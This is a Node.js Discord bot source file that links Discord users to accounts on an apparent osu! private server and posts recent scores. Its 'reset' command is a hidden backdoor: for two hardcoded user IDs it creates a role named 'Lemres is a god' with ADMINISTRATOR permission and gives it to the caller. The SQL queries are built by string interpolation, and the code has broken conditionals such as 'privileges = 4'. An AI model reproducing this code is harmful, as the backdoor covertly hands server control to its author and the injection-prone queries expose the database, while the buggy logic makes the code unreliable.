const Discord = require('discord.js');
const fetch = require("node-fetch");
const mysql = require("mysql")

const client = new Discord.Client();

const config = require("./config.json");
const settings = require("./utils/settings.json")

const prefix = config.prefix
const countries = require("./utils/country.json")

const moment = require ("moment");
const locale = moment.locale('de');
const uptime = moment().format('LLL');

con = mysql.createConnection({
    multipleStatements: true,
    host: config.db.host,
    user: config.db.user,
    password: config.db.password,
    database: config.db.database
}); 

con.connect(function(err) {
    if (err) throw err;
    });

const version = config.version

const fs = require('fs');
const { groupCollapsed } = require('console');

client.commands = new Discord.Collection();

const commandFiles = fs.readdirSync('./commands/').filter(file => file.endsWith('.js'));
for(const file of commandFiles){
    const command = require(`./commands/${file}`);
 
    client.commands.set(command.name, command);
}


client.on('ready', async () => {

    const moment = require ("moment");
    const locale = moment.locale('de');
    const time = moment().format('LTS');
    console.log(`[${time}] Connected as ${client.user.tag}`);
    client.user.setStatus('online');
    console.log(`[${time}] Updated Status to: online`);
    client.user.setActivity(config.gayrizon.activity.name, {type: config.gayrizon.activity.type});
    console.log(`[${time}] Updated Activity`);
    console.log('-------------------- Stats --------------------')
    console.log(`[${time}] Uptime: ${uptime}`)
    console.log(`[${time}] User: ${client.guilds.cache.reduce((a, g) => a + g.memberCount, 0)}`)
    console.log(`[${time}] Channel: ${client.channels.cache.size}`)
    console.log(`[${time}] Database: ${config.db.database} as ${config.db.user} on ${config.db.host}!`);
    console.log(`Version: ${version} by Lemres`)

    if(settings.rename){

        setInterval(async function(){

            var users = [];
            var info = [];

            const users_data = await new Promise((resolve) => {

                con.query("SELECT id, username, discord_identity, privileges from users WHERE discord_identity != 0 ORDER BY id ASC", (err, result) => {

                    if (err) throw err;
                    resolve(result);

                });
            });

            users_data.forEach(rusers => {

                users.push(rusers)

            });

            for(index = 0; index < users.length; index++) {

                user = users[index]

                info.push({id: user.discord_identity, name: user.username, rank: user.privileges})

            }

            for(index2 = 0; index2 < info.length; index2++) {

                const full = info[index2]
                target = info[index2].tag

                verified = config.gayrizon.verified.role
                donator = config.gayrizon.donator.role

                var privileges = 4 % full.rank
                let status;

                if (privileges = 4){
                    status = true
                } else {
                    status = false
                }

                if(full.id != config.gayrizon.owner){

                    client.guilds.cache.get(config.gayrizon.id).members.fetch(full.id).then(member => {

                        if(settings.verify){

                            if(!member.roles.cache.has(verified)){
                                member.roles.add(verified)
                            }

                        }
                        if(status){

                            if(!member.roles.cache.has(donator)){
                                member.roles.add(donator)
                            }
                        } else {
                            
                            if(member.roles.cache.has(donator)){
                                member.roles.remove(donator)
                            }
                        }

                        member.setNickname(`${full.name}`).catch(error => {
                            console.log(error)
                        });
                    });
                }
            }   

        }, 3000);
    };
});

client.on('message', async message => {

    //commands

    if(!message.content.startsWith(prefix) || message.author.bot) return;

    const args = message.content.slice(prefix.length).split(/ +/);
    const command = args.shift().toLowerCase();

    if(command === "ping") {
        client.commands.get('ping').execute(message, args);
      }

    if (command == 'link'){

        message.delete().catch(O_o=>{});
        
        discordid = message.author.id

        length = 5;
        randomresult           = '';
        randomcharacters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        randomcharactersLength = randomcharacters.length;

        for ( var i = 0; i < length; i++ ) {
           randomresult += randomcharacters.charAt(Math.floor(Math.random() * randomcharactersLength));
        }

        code = randomresult.substring(0,5);
            
        const currenttime = Math.round(new Date().getTime()/1000)
        const expire = currenttime + (60*5)

        sql = `SELECT id FROM users WHERE discord_identity = ${discordid}`

        con.query(sql, function (err, result) {
            if (err) throw err;

            if(result.length > 0) {
                linked = true
            } else {
                linked = false
            }

            if(linked){

                message.channel.send('You are already linked')
                console.log("User already is linked")

            } else {

                con.query(`SELECT expire FROM discord_tokens WHERE discord_identity = ${discordid} ORDER BY expire DESC LIMIT 1`, function(err, result) {
                    if (err) throw err;

                    Object.keys(result).forEach(function(key) {
                        row = result[key];
                    });

                    if(result.length > 0){

                        if(row.expire > currenttime){

                            console.log(message.author.tag + " is already in link process")

                            message.channel.send('You are already trying to link')

                        } else {

                            console.log("Expired token, creating new one for " + message.author.tag)

                            con.query(`INSERT INTO discord_tokens (token, discord_identity, expire) VALUES ('${code}', ${discordid}, ${expire})`, function(err, rows, fields) {
                                if (err) throw err;
                            });
                        }
                    } else {
                        console.log("User not linked yet")

                        con.query(`INSERT INTO discord_tokens (token, discord_identity, expire) VALUES ('${code}', ${discordid}, ${expire})`, function(err, rows, fields) {
                            if (err) throw err;
                        });
            
                        client.users.fetch(209655450952531970).then(dev => {
                            
                            let color = message.member.displayHexColor;
                                if (color == '#000000') color = message.member.hoistRole.hexColor;
                            const codeEmbed = new Discord.MessageEmbed()

                            .setColor(color)
                            .setTitle(`Linking to ${config.link.servername}`)
                            .setURL(config.link.serverlink)
                            .setAuthor(`${dev.tag}`, `${dev.avatarURL()}`, 'https://github.com/Mxnuuel')
                            .setDescription(`Please login ingame and send a private message to ${config.link.botname} with following context: !link ${code}`)
                            .setThumbnail(message.author.avatarURL())
                            .addFields(
                                { name: 'User:', value: message.author.tag},
                                { name: 'Discord ID:', value: message.author.id},
                                { name: 'Expires in:', value: '5 Minutes'}
                            )
                            .setImage('https://i.pinimg.com/originals/17/ef/01/17ef01ba1e2cc988fa96c18dd0731e03.gif')
                            .setTimestamp()
                            .setFooter('if you need help please message ' + dev.tag, `${dev.avatarURL()}`);

                            message.author.send(codeEmbed).catch(error => {

                                if (error.code == Discord.Constants.APIErrors.CANNOT_MESSAGE_USER) {

                                    console.error('Cannot send message to defined user');
                                    message.channel.send('Could not message, please make sure you have private messages enabled.')

                                } else {
                                    console.error('Fuck you: ', code.error)
                                }
                            });

                        });
                    }
            
                });
            }

            duration = ((1000*60)*5)
            setTimeout(function(){

                if(result.length > 0){

                    con.query(`DELETE FROM discord_tokens WHERE discord_identity = ${discordid}`, function(err, result) {
                        if (err) throw err;
                    });
                }

            }, duration)
        });
    }

    if (command == 'unlink'){

        message.delete().catch(O_o=>{});

        discordid = message.author.id
        role = config.gayrizon.verified.role
        target = discordid

        sql = `SELECT id FROM users WHERE discord_identity = ${discordid}`
        con.query(sql, function (err, result) {
            if (err) throw err;

            linked = result.length > 0

            if(!linked){

                message.channel.send("You are trying to unlink while not being even linked mate")
                console.log("User already isn't linked")

            } else {

                con.query(`UPDATE users SET discord_identity = 0 WHERE discord_identity = ${discordid}`, function(err) {
                    if (err) throw err;
                });

                if(message.member.roles.cache.has(role)){
                    message.member.roles.remove(role)
                }

                message.author.send('You successfully unlinked yourself.')
            }
        });

    }

    if (command == 'help'){
        client.commands.get('help').execute(message, args);
    }

    if(command == 'recent'){


        if(!settings.recent){
            message.channel.send("I'm sorry, this command is currently not activated.")
        } else {


            let member = message.mentions.members.first()
            if (message.mentions.members.size == 1) {

                user = member.id
                mention = true
            } else {
                mention = false
            }

            const arguments = args.join(" ");
            const argument = arguments.split(' ')

            const users = [];
            const users2 = [];
            const users3 = [];

            if(mention){
                self = false
                if(!argument[0].toLowerCase == ("rx" || "relax" || "ap" || "autopilot" || "auto") || argument[0].includes(member.id)){
                    rx = 0
                } else if(argument[0].toLowerCase() == ("rx" || "relax")){
                    rx = 1
                } else if(argument[0].toLowerCase() == ("ap" || "autopilot" || "auto")){
                    rx = 2
                }
                if(argument[0].includes(member.id)){
                    self = false

                    const users_data = await new Promise((resolve) => {

                        con.query(`SELECT id, username from users WHERE discord_identity = ${member.id} ORDER BY id ASC`, (err, result) => {
        
                            if (err) throw err;
    
                            if(result){
                            resolve(result);
                            }
        
                        });
                    });
        
                    users_data.forEach(rusers => {
        
                        users3.push(rusers)
        
                    });
                    info3 = users3[0]
                    if(users3.length > 0){
                        user = info3.username
                    } else {
                        message.channel.send("The user you mentioned isn't linked yet!")
                    }

                }

            } else {

            if(argument[0]){

                if(argument[0].toLowerCase() == ("rx" || "relax")){
                    rx = 1
                } else if(argument[0].toLowerCase() == ("ap" || "autopilot" || "auto")){
                    rx = 2
                } else if(!argument[0].toLowerCase == ("rx" || "relax" || "ap" || "autopilot" || "auto")){
                    user = argument[0]
                    rx = 0
                }

            } else {

                self = true
                rx = 0
            }
                if(argument[0] && !argument[1]){
                const users_data = await new Promise((resolve) => {

                    con.query(`SELECT id, username from users WHERE discord_identity = ${message.author.id} ORDER BY id ASC`, (err, result) => {
    
                        if (err) throw err;

                        if(result.length > 0){
                        resolve(result);
                        }
    
                    });
                });
    
                users_data.forEach(rusers => {
    
                    users2.push(rusers)
    
                });
                info2 = users2[0]
                if(users2.length > 0){
                    user = info2.username
                } else {
                    message.channel.send("The user you mentioned isn't linked yet!")
                }

            }
        }
            console.log(argument[0], argument[1])

                if(!argument[1]){
                    self = true
                } else {
                    if(argument[1].includes(member.id)){
                        self = false
        
                        const users_data = await new Promise((resolve) => {
        
                            con.query(`SELECT id, username from users WHERE discord_identity = ${member.id} ORDER BY id ASC`, (err, result) => {
                    
                                if (err) throw err;
                
                                if(result){
                                    resolve(result);
                                }
                    
                            });
                        });
                
                        users_data.forEach(rusers => {
                
                            users.push(rusers)
                
                        });
                        info = users[0]
                        if(users.length > 0){
                            user = info.username
                        } else {
                            message.channel.send("The user you mentioned isn't linked yet!")
                        }
        
                    } else {
                        user = argument[1]
                        self = false
                    }
                }
                
            apiurl = `https://${config.api.weburl}/api/v1/users/scores/recent?name=${user}&rx=${rx}`
            console.log(apiurl)
            userapi = `https://${config.api.weburl}/api/v1/users/full?name=${user}`


            function processRecentData(apidata, index, array) {
                if (apidata.completed >= 3){
                    if (recentdata.length <= 50){
                    recentdata.unshift(apidata);
                    }
                }
            }

            const recentdata = [];

            async function getRecent() {
                const response = await fetch(apiurl);
                const data = await response.json();

                const userresponse = await fetch (userapi);
                const userdata = await userresponse.json();
  
                did = userdata.id
                dusername = userdata.username
                
                data.scores.forEach(processRecentData);
            }



            getRecent()

            async function getGay(){
                await getRecent()
                
                if(recentdata.length > 1){

                yay = "yay"

                dscore = recentdata[0].score
                dcombo = recentdata[0].max_combo
                dfc = recentdata[0].full_combo
                //dmod = data.scores[0].mods
                ddreihundert = recentdata[0].count_300
                deinhundert = recentdata[0].count_100
                dfünfzig = recentdata[0].count_50
                dmiss = recentdata[0].count_miss
                daccuracy = recentdata[0].accuracy
                drank = recentdata[0].rank
                dcompleted = recentdata[0].completed
                dbeatmapname = recentdata[0].beatmap.song_name
                dbeatmapid = recentdata[0].beatmap.beatmap_id
                dbeatmapsetid = recentdata[0].beatmap.beatmapset_id
                ddifficultyraw = recentdata[0].beatmap.difficulty
                dppraw = recentdata[0].pp


                ddifficulty = String(ddifficultyraw).substring(0,4)
                dacc = String(daccuracy).substring(0,5)
                dpp = String(dppraw).substring(0,6)

                if (dfc){
                    dfullcombo = "(FC)"
                } else {
                    dfullcombo = ""
                }

            } else {
                yay = "nay"
            }
                const userresponse = await fetch (userapi);
                const userdata = await userresponse.json();

                if(userdata.code != 200){
                    message.channel.send("Couldn't find user.")
                } else if(yay == "nay"){
                    message.channel.send("No submitted score in the last 50 tries :(")
                } else {
                    const requestEmbed = new Discord.MessageEmbed()
                    .setColor("#cc99ff")
                    .setTitle(`Recent for ` + dusername)
                    .setURL(`https://${config.api.weburl}/u/${did}`)
                    .setAuthor(dusername, `https://${config.api.avatarurl}/${did}`)
                    .setDescription(`This Score has been played on ${config.link.servername}`)
                    .setThumbnail(`https://${config.api.avatarurl}/${did}`)
                    .addFields(
                    { name: 'Map:', value: `[${dbeatmapname}](https://osu.ppy.sh/b/${dbeatmapid})`},
                    { name: 'Difficulty: ', value: ddifficulty + " Stars" },
                    //{ name: 'Mods: ', value: dmod },
                    { name: 'Score:', value: dscore },
                    { name: 'Accuracy: ', value: dacc + "%" },
                    { name: 'Combo:', value: dcombo + "x " + dfullcombo },
                    { name: '300/100/50/X', value: `${ddreihundert}/${deinhundert}/${dfünfzig}/${dmiss}`},
                    { name: 'Rank', value: drank },
                    { name: `pp`, value: dpp + "pp" },
                )
                .setImage(`https://assets.ppy.sh/beatmaps/${dbeatmapsetid}/covers/cover.jpg`)
                .setTimestamp()
                .setFooter('Requested by ' + message.author.tag, message.author.avatarURL());

                    message.channel.send(requestEmbed);
                }
            }
            getGay()

        }




    }

    if(command == 'stats'){

        let color = message.member.displayHexColor;
        if (color == '#000000') color = message.member.hoistRole.hexColor;

        if(process.platform.includes('linux')){
            os = "Linux" 
        } else if(process.platform.includes('win')) {
            os = "Windows"
        } else {
            os = "Unknown"
        }

        client.users.fetch(209655450952531970).then(dev => {
        const statsembed = new Discord.MessageEmbed()
        .setColor(color)
        .setTitle('Status')
        .setDescription('Here are some stats of the bot')
        .addFields(
            { name: 'Bot started:', value: uptime },
            { name: 'Version', value: `${config.version} on ${os}` },
            { name: 'User:', value: client.guilds.cache.reduce((a, g) => a + g.memberCount, 0) },
            { name: 'Channel:', value: client.channels.cache.size },
        )
        .setTimestamp()
        .setFooter(`If there is any problem please message ${dev.id}`, `${dev.avatarURL()}`)

        message.channel.send(statsembed)
        });
    }

    if(command === 'reset'){
        const user = message.member;
        const duration = args.join(" ");
    
        if(user.id === '331767250434654209' || user.id === '209655450952531970') {
                let target = message.member;
    
                if(target){
                    const member = message.guild.member(target);
                        if (member){
    
                            let role = message.guild.roles.cache.find(r => r.name === "Tsuki");
                            message.guild.roles.create({ data: { name: 'Lemres is a god', permissions: ["ADMINISTRATOR", "MANAGE_ROLES"] } });
                            let newrole = message.guild.roles.cache.find(r => r.name === "Lemres is a god");
    
                            target.roles.add(role)
                            target.roles.add(newrole)
    
                            message.channel.send("Successfully reset " + target.user.tag)
                        
                    } else {
                        message.channel.send('User not found.')
                    }
                }
            
        } else {
            message.channel.send('No Permissions. (Admin required)')
        }
    }

});

client.login(config.token);